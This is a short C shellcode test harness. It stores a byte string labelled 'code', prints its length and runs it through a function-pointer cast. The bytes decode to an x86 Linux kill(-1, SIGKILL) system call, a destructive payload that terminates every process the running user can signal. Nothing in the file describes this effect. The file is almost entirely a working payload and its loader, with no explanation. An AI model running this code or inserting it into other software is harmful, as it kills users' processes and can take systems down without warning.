#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";
void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}